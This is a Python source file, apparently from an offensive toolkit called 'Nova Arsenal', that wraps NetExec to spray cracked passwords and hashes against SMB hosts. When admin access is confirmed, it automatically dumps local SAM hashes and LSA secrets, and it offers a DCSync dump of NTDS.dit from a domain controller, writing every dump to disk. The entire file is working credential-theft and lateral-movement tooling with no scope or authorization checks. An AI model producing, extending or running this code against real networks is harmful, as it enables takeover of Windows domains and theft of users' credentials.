"""
Nova Arsenal — SMB Validator
Validates cracked credentials against SMB targets using NetExec,
then auto-dumps SAM/LSA/NTDS if admin access is confirmed.
"""

import subprocess
import shutil
import json
import re
from pathlib import Path

CLONE_DIR   = Path(__file__).resolve().parents[3].parent / "cloned_repos"
NETEXEC_DIR = CLONE_DIR / "NetExec"


def _nxc_bin() -> str | None:
    """Find nxc / netexec / crackmapexec binary."""
    for name in ("nxc", "netexec", "crackmapexec", "cme"):
        found = shutil.which(name)
        if found:
            return found
    venv = NETEXEC_DIR / "venv" / "bin" / "nxc"
    if venv.exists():
        return str(venv)
    return None


class SMBValidator:
    def __init__(self, verbose: bool = False):
        self.verbose = verbose
        self.nxc = _nxc_bin()
        if not self.nxc:
            print("[!] NetExec/CrackMapExec not installed.")
            print("    Install: pipx install netexec   OR   pip install netexec")

    def _run(self, cmd: list[str]) -> str:
        if self.verbose:
            print(f"[*] CMD: {' '.join(cmd)}")
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return result.stdout + result.stderr
        except subprocess.TimeoutExpired:
            return "[!] Command timed out"
        except FileNotFoundError:
            return f"[!] Binary not found: {cmd[0]}"

    # ─────────────────────────────────────────────────────────────
    # VALIDATE — test creds against one or many targets
    # ─────────────────────────────────────────────────────────────
    def validate(self, target: str, username: str, password: str = "",
                 hashes: str = "", domain: str = "") -> dict:
        """
        Spray credentials against SMB target.
        Returns dict with keys: target, admin, output
        """
        if not self.nxc:
            return {"target": target, "admin": False, "output": "[!] nxc not found"}

        cmd = [self.nxc, "smb", target, "-u", username]
        if hashes:
            cmd += ["-H", hashes]
        else:
            cmd += ["-p", password]
        if domain:
            cmd += ["-d", domain]

        out = self._run(cmd)
        admin = "(Pwn3d!)" in out or "Pwn3d!" in out
        authed = "[+]" in out

        status = "ADMIN" if admin else ("AUTH" if authed else "FAIL")
        marker = {"ADMIN": "🔴", "AUTH": "🟡", "FAIL": "⚫"}[status]
        print(f"  {marker} {target} | {username} | {status}")
        if self.verbose:
            print(out.strip())

        return {"target": target, "admin": admin, "authed": authed, "output": out}

    def validate_file(self, targets_file: str, username: str, password: str = "",
                      hashes: str = "", domain: str = "") -> list[dict]:
        """Validate creds against all IPs/hosts in a file."""
        path = Path(targets_file)
        if not path.exists():
            print(f"[!] Targets file not found: {targets_file}")
            return []
        targets = [l.strip() for l in path.read_text().splitlines() if l.strip()]
        print(f"[*] Testing {len(targets)} targets — {username}")
        results = []
        for t in targets:
            results.append(self.validate(t, username, password, hashes, domain))
        return results

    def validate_cracked_file(self, cracked_file: str, target: str,
                               domain: str = "") -> list[dict]:
        """
        Parse hashcat --outfile-format=2 output (hash:plaintext) and
        test every cracked password against the target.
        """
        path = Path(cracked_file)
        if not path.exists():
            print(f"[!] Cracked file not found: {cracked_file}")
            return []

        pairs = []
        for line in path.read_text().splitlines():
            if ":" in line:
                parts = line.rsplit(":", 1)
                pairs.append(parts)   # [hash_or_user, plaintext]

        if not pairs:
            print("[!] No cracked pairs found in file.")
            return []

        print(f"[*] Validating {len(pairs)} cracked password(s) against {target}")
        results = []
        for pair in pairs:
            user = pair[0].split("\\")[-1] if "\\" in pair[0] else "Administrator"
            pw   = pair[1]
            results.append(self.validate(target, user, pw, domain=domain))
        return results

    # ─────────────────────────────────────────────────────────────
    # DUMP — SAM, LSA, NTDS
    # ─────────────────────────────────────────────────────────────
    def dump_sam(self, target: str, username: str, password: str = "",
                 hashes: str = "", domain: str = ""):
        """Dump local SAM hashes (requires local admin)."""
        print(f"\n[*] Dumping SAM on {target}...")
        cmd = [self.nxc, "smb", target, "-u", username]
        if hashes:
            cmd += ["-H", hashes]
        else:
            cmd += ["-p", password]
        if domain:
            cmd += ["-d", domain]
        cmd += ["--sam"]
        out = self._run(cmd)
        print(out)
        self._save_dump("sam", target, out)

    def dump_lsa(self, target: str, username: str, password: str = "",
                 hashes: str = "", domain: str = ""):
        """Dump LSA secrets (domain creds cached on host)."""
        print(f"\n[*] Dumping LSA on {target}...")
        cmd = [self.nxc, "smb", target, "-u", username]
        if hashes:
            cmd += ["-H", hashes]
        else:
            cmd += ["-p", password]
        if domain:
            cmd += ["-d", domain]
        cmd += ["--lsa"]
        out = self._run(cmd)
        print(out)
        self._save_dump("lsa", target, out)

    def dump_ntds(self, target: str, username: str, password: str = "",
                  hashes: str = "", domain: str = ""):
        """DCSync NTDS.dit — domain admin required."""
        print(f"\n[*] DCSync NTDS on {target} (DC)...")
        cmd = [self.nxc, "smb", target, "-u", username]
        if hashes:
            cmd += ["-H", hashes]
        else:
            cmd += ["-p", password]
        if domain:
            cmd += ["-d", domain]
        cmd += ["--ntds"]
        out = self._run(cmd)
        print(out)
        self._save_dump("ntds", target, out)

    def _save_dump(self, kind: str, target: str, output: str):
        fname = f"{kind}_{target.replace('.','_').replace('/','_')}.txt"
        Path(fname).write_text(output)
        print(f"[+] Saved → {fname}")

    # ─────────────────────────────────────────────────────────────
    # AUTO CHAIN — validate → dump everything accessible
    # ─────────────────────────────────────────────────────────────
    def auto_chain(self, target: str, username: str, password: str = "",
                   hashes: str = "", domain: str = ""):
        """
        Validate creds → if admin, auto-dump SAM + LSA.
        If LSA contains domain creds, escalate and offer NTDS.
        """
        print(f"\n[Nova SMB] ══ Auto Chain → {target} ══")
        result = self.validate(target, username, password, hashes, domain)

        if not result["authed"]:
            print("[✗] Authentication failed — check creds.")
            return

        if result["admin"]:
            print("[+] Admin confirmed — dumping SAM + LSA...")
            self.dump_sam(target, username, password, hashes, domain)
            self.dump_lsa(target, username, password, hashes, domain)
            print("\n[*] Tip: If LSA shows domain creds, run --ntds against the DC.")
        else:
            print("[~] Authenticated but no admin — can enumerate shares/users.")
            cmd = [self.nxc, "smb", target, "-u", username,
                   "-p" if not hashes else "-H", password or hashes,
                   "--shares"]
            out = self._run(cmd)
            print(out)
